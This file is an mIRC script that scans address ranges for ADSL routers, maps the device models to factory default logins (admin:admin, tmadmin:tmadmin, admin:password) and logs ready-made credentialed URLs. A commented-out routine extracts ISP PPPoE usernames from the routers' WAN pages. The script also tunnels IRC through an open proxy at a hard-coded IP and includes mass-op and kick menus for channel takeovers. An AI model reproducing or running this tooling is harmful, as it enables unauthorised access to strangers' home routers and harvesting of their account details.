;on *:CONNECT:cariport

on *:start:ss.setvar

alias regtest {
  var %regtext <INPUT TYPE="TEXT" NAME="wan_PPPUsername" SIZE="32" MAXLENGTH="71" VALUE="afiq5295@streamyx"><!-- TPLINK SMILE add by jqzhou end -->
  if ($regex(%regtext,/([A-Za-z0-9._%+-]+@streamyx)/)) {
    e ::: $regml(1) :::
  }
}

alias -l ss.setvar {
  set %ss.head.ua User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20110319 Firefox/4.0
  set %ss.head.aa Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  set %ss.head.al Accept-Language: en-us,en;q=0.5
  set %ss.head.ae Accept-Encoding: gzip, deflate
  set %ss.head.ac Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
  set %ss.head.ka Keep-Alive: 115
  set %ss.setflag 0
  set %ss.bot.count 0
  set %ss.bot.limit 10
  set %ss.bot.timeout 5
  set %ss.currentip 0
  set %ss.currentip.count 0
  ;$+(GET / HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,%ss.head.ua,$CRLF,%ss.head.aa,$CRLF,%ss.head.al,$CRLF,%ss.head.ae,$CRLF,%ss.head.ac,$CRLF,%ss.head.ka,$CRLF,Authorization: Basic %auth,$CRLF,$CRLF)
  ;$+(GET / HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,Authorization: Basic %auth,$CRLF,$CRLF)
}

alias ss.pinghost {
  sockclose scan.head.*
  sockclose scan.get.*
  ss.setvar
  write -c sockread.txt
  ;sockopen scan.head.test 60.48.165.2 80
  sockopen scan.head.test $1 80
}

;regex \b(http://)[a-zA-Z0-9]*:[a-zA-Z0-9]*@([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})/
alias ss.initscan {
  sockclose scan.head.*
  sockclose scan.get.*
  ss.setvar
  $iif(!@result,window -e @result)
  $iif(!@junk,window -e @junk)
  $iif(!@debug,window -e @debug)
  write -c streamyx.result.txt
  echo @result 3++++++++++START+++++++++++++++
  if ($ss.purifyip($1-)) {
    %ss.currentip = $ss.setbaseip($regml(1))
    e init scan: %ss.currentip
    ss.startnewbot
  }
}

alias -l ss.startnewbot {
  while ($ss.botcountcheck) {
    var %ss.ip $ss.getcurrentip
    var %ss.sockname scan.head. $+ %ss.currentip.count
    sockopen %ss.sockname %ss.ip 80
    .timer $+ head.scan. $+ %ss.currentip.count 1 %ss.bot.timeout ss.bottimeout %ss.sockname
    echo @debug [StartNewNot] ip count: %ss.currentip.count ip: %ss.ip botcount: %ss.bot.count ::: %ss.sockname
  }
  if (%ss.currentip.count = 255) .timerend 1 1 echo @result 4++++++++++END+++++++++++++++
}

alias -l ss.botcountcheck {
  if (%ss.currentip.count < 255) {
    if (%ss.bot.count < %ss.bot.limit) {
      inc %ss.bot.count
      return $true
    }
  }
  ;echo @debug ip count: %ss.currentip.count bot count: %ss.bot.count
  return $false
}

alias -l ss.bottimeout {
  ;$iif(%ss.bot.count < 1,e 6[bot timeout] sockname: $1 botcount: %ss.bot.count)
  sockclose $1
  dec %ss.bot.count
  ss.startnewbot
}

;verify ip format or extract if any ip in there
alias -l ss.purifyip {
  if ($regex($1-,/(\b[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/)) return $true
  return $false
}

;replace 4th token with 1. Token is 46 = . (decimal)
alias -l ss.setbaseip {
  var %ss.tok $gettok($1,4,46)
  if (%ss.tok != 1) || (%ss.tok != 255) {
    return $puttok($1,1,4,46)
  }
  else return $1
}

alias -l ss.getcurrentip {
  if ($gettok(%ss.currentip,4,46) < 255) {
    inc %ss.currentip.count 1
    %ss.currentip = $puttok(%ss.currentip,%ss.currentip.count,4,46)
    return %ss.currentip
  }
  ;else return $ss.setbaseip(%ss.currentip)
}

/*
* HEAD /private/index.html HTTP/1.1
* Host: <host here>
*/

ON 1:SOCKOPEN:scan.head.*: {
  if ($sockerr)  { return }
  ;e (ELSE) :: $sockname :: $sock($sockname).ip ::: $sock($sockname).port
  .sockwrite -tn $sockname $+(HEAD / HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,$CRLF)
}
ON 1:SOCKCLOSE:scan.head.*: {
  ;ss.startnewbot
  dec %ss.bot.count
  e [ $event ] $sockname -------------------------------------------------------
}

;TD-8816 maybe same as TD-W8901G x
ON 1:SOCKREAD:scan.head.*:{
  .sockread %ss.read
  echo @junk 4( $event on $sockname ) ::: %ss.read  .
  if ($gettok(%ss.read,2,32) == 401) {
    timer $+ $gettok($sockname,3,46) off
    ;echo @result [ALIVE] $sock($sockname).ip $sock($sockname).port  ::: %ss.read ::: http:// $+ $sock($sockname).ip $+ /
    sockopen scan.get. $+ $sock($sockname).ip $sock($sockname).ip $sock($sockname).port
    ;run "C:\Program Files (x86)\Internet\Mozilla Firefox\firefox.exe" -new-tab http:// $+ $sock($sockname).ip $+ /
    ss.bottimeout $sockname
  }
  else {
    e [- $event -] %ss.read
    ss.bottimeout $sockname
  }
  unset %ss.read
  halt
}

/*
* GET /private/index.html HTTP/1.1
* Host: <host here>
* Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
*/
ON 1:SOCKOPEN:scan.get.*: {
  if ($sockerr) { return }
  .sockwrite -tn $sockname $+(HEAD / HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,$CRLF)
}

ON 1:SOCKREAD:scan.get.*: {
  .sockread %ss.read
  if ($gettok(%ss.read,2,32) == basic) {
    var %ip $sock($sockname).ip
    var %url
    if ($gettok(%ss.read,2,61) == "TD-W8901G") || ($gettok(%ss.read,2,61) == "TD-8817") || ($gettok(%ss.read,2,61) == "TD-W8101G") || ($gettok(%ss.read,2,61) == "ADSL Modem") {
      %url = http://admin:admin@ $+ $sock($sockname).ip $+ /    
      ss.bottimeout $sockname
    }
    elseif ($gettok(%ss.read,2,61) == "DB102 ADSL 2/2+ Modem") {
      %url = http://tmadmin:tmadmin@ $+ $sock($sockname).ip $+ /
      ss.bottimeout $sockname
    }
    elseif ($gettok(%ss.read,2,61) == "ADSL USB Modem/Router") || ($gettok(%ss.read,2,61) == "WBR-3601") || ($gettok(%ss.read,2,61) == "ADSL Modem/Router") || ($gettok(%ss.read,2,61) == "Viking") {
      %url = http://admin:password@ $+ $sock($sockname).ip $+ /
      ss.bottimeout $sockname
    }
    elseif ($gettok(%ss.read,2,32) == Basic) {
      %url = http:// $+ $sock($sockname).ip $+ /
      ss.bottimeout $sockname
    }
    echo @result [:ALIVE:] %ip ::: $gettok(%ss.read,3-,32) ::: %url
    write -a streamyx.result.txt ( $+ $date $+ ) ( $+ $time $+ ) %ip $gettok(%ss.read,3-,32) %url
  }
  unset %ss.read
  halt
}
/*
if ($sockname == scan.get.TD-W8901G) {
  var %auth = $base64(admin:admin).enc
  e ( $EVENT ) :: $sockname :: $sock($sockname).ip ::: $sock($sockname).port ::: %auth ::: flag: %ss.setflag
  .sockwrite -tn $sockname $+(GET / HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,User-Agent: %ss.head.ua,$CRLF,Authorization: Basic %auth,$CRLF,$CRLF)
  ;.sockwrite -tn $sockname $+(GET /basic/home_wan.htm HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,Authorization: Basic %auth,$CRLF,$CRLF)
}
if ($sockname == scan.get.DB102) {
  var %auth = $base64(tmadmin:tmadmin).enc
  .sockwrite -tn $sockname $+(GET /MainPage?id=25 HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,Authorization: Basic %auth,$CRLF,$CRLF)
}


ON 1:SOCKREAD:scan.get.*:{
  .sockread %ss.read2
  ;e 13 %ss.read  .
  write -a sockread.txt $sock($sockname).ip ::: %ss.read2
  if ($gettok(%ss.read2,2,32) == 401) {
    e (ERROR) %ss.read2
    sockclose $sockname
    halt
  }
  if ($gettok(%ss.read2,2,32) == 200) {
    $iif(!%ss.setflag,%ss.setflag = 1)
    if ($sockname == scan.get.DB102) {
      e (INFO) YEZZA
    }
    if ($sockname == scan.get.TD-W8901G) && (%ss.setflag == 1) {
      e (INFO) YEZZA $sockname ::: %ss.setflag <-- flag
      ;http://60.51.92.38/navigation-basic.html
      ;.sockwrite -tn $sockname $+(GET /basic/home_wan.htm HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,%ss.head.ua,$CRLF,Authorization: Basic %auth,$CRLF,$CRLF)
      .sockwrite -tn $sockname $+(GET /basic/home_wan.htm HTTP/1.1,$CRLF,Host: $sock($sockname).ip,$CRLF,%ss.head.ua,$CRLF,%ss.head.aa,$CRLF,%ss.head.al,$CRLF,%ss.head.ae,$CRLF,%ss.head.ac,$CRLF,%ss.head.ka,$CRLF,Authorization: Basic %auth,$CRLF,$CRLF)
      %ss.setflag = 2
      e (INFO) YEZZA2 $sockname ::: %ss.setflag <-- flag
      if ($regex(%ss.read2,/([A-Za-z0-9._%+-]+@streamyx)/)) {
        e ::: $regml(1) :::
        sockclose $sockname
      }
    }
  }
  ;.dll WhileFix.dll WhileFix .
  unset %ss.read2
  halt
}
*/

;test sock proxy
alias nS.open { $iif(!$sock(myric).status,sockopen power 210.0.209.108 3128,return) | .timer.nSock 1 1 nS.logo Status: $!sock(power).status }
alias nS.close { $iif($sock(myric).status,sockwrite -tn myric quit You are temporarily banned from this network. Excessive Flooding,return) | .timer.nSock 1 1 nS.logo Status: $iif(!$sock(myric).status,inactive) }

ON 1:SOCKOPEN:power: {
  if ($sockerr)  { return }
  .sockwrite -tn $sockname CONNECT $server $+ : $+ $port $+(HTTP/1.0,$CRLF,$CRLF)
}
ON *:SOCKREAD:power:{
  .sockread %s.read
  if ($gettok(%s.read,1,32) == PING) { sockwrite -tn $sockname PONG : $gettok(%s.read,2,58) | return }
  var %s.raw = $gettok(%s.read,2,32), %s.chan = $gettok(%s.read,3,32), %s.nix = $gettok($gettok(%s.read,1,58),1,33), %s.$1- = $gettok(%s.read,2,58)
  ;if (!$regex(%s.raw,/(200|PRIVMSG|NOTICE)/)) || (kantoi isin %:reason) { return }

  if ($gettok(%s.read,1-2,32) == HTTP/1.0 200) || ($gettok(%s.read,1-2,32) == HTTP/1.1 200) {
    .sockwrite -tn $sockname NICK %s.nick
    .sockwrite -tn $sockname USER l337. $+ $r(0,9) $+ $r(0,9) $r(a,z) $r(a,z) : $+ 15La13.15e13X15presión13.15v8 Build: 1727 edición española
    .timersssssssssssss 1 5 sockrename $sockname myric
    ;.timer.s.away 1 3 sockwrite -tn $sockname away 14134rn 70 r34d15;14 r34d 70 134rn15;
  }
  unset %s.read
}
ON *:SOCKREAD:myric:{
  .sockread %s.read
  ;.dll WhileFix.dll WhileFix .
  if ($gettok(%s.read,1,32) == PING) { sockwrite -tn $sockname $replace(%s.read,PING,PONG) | halt }
  $iif($gettok(%s.read,2,32) !isin NOTICE PRIVMSG,halt)
  .tokenize 58 %s.read
  var %s.chan = $gettok(%s.read,3,32), %s.nix = $gettok($gettok(%s.read,1,58),1,33)
  if (%s.nix isreg %s.chan) {
    ;removed
    halt
  }
  unset %s.read
  halt
}
on *:START:{ hmake -s flood 100 | hload -s flood ../osc/hflood.dll | hmake -s k 100 | hmake -s pro 1000 }

;testing mode... 15The13.15e13X15pression13.15v8 12G4o8o12g3l4e™ version. 

menu menubar,channel {
  -
  sockclose !!: { $iif($sock(myric).status,sockclose myric,halt) }
  $iif($sock(myric).status,Close Counter ( active ),Open Counter ( inactive )) :{
    $iif(!$sock(myric).status,nS.open,nS.close)
  }
  -
  $iif(!$sock(myric).status,$style(2)) $iif(%s.nick !ison #,Join Counter ( $active ),Part Counter ( $active )) :{
    if (%s.nick ison #) { nS.part # | halt }
    nS.join #
    .timer.nSock 1 2  nS.priv # !op
  }
  Change Counter Nick ( %s.nick ) : {
    var %nS.x = $$?="Please put new sock counter nick"
    $iif(%nS.x,set %s.nick $ifmatch,halt)
    $iif($sock(myric).status,nS.nick %nS.x)
  }
  Change MyRIC[clear] { rlevel 25 | hfree w x | ns.priv # revenge cleared !! | nS.nick MyRIC[clear] }
  Change MyRIC { ns.priv # ready to take any challange now :) | nS.nick MyRIC }
  Sock Input ( $iif($group(#sock.in).status == on,Enable,Disable) ) : { $iif($group(#sock.in).status == on,.disable #sock.in,.enable #sock.in) }
  Sock Counter ( $iif(%nS.on,Enable,Disable) ) : { set %nS.on $iif(%nS.on,$false,$true) }
}
menu nicklist {
  Sock menu
  .Op/DeOp: sockwrite -tn myric mode # $iif($$1 isop #,-,+) $+ $str(o,12) $1 $2 $3 $4 $5 $6 $7 $8 $9 $10 $11 $12
  .Voice/DeVoice: sockwrite -tn myric mode # $iif($$1 isvo #,-,+) $+ $str(v,12) $1 $2 $3 $4 $5 $6 $7 $8 $9 $10 $11 $12
  .-
  .Huarghhhhhh:/sockwrite -tn myric kick # $$* Huarghhhhhh... Ptuih!!~ Lag cam Aram cam Sakai !!!
}
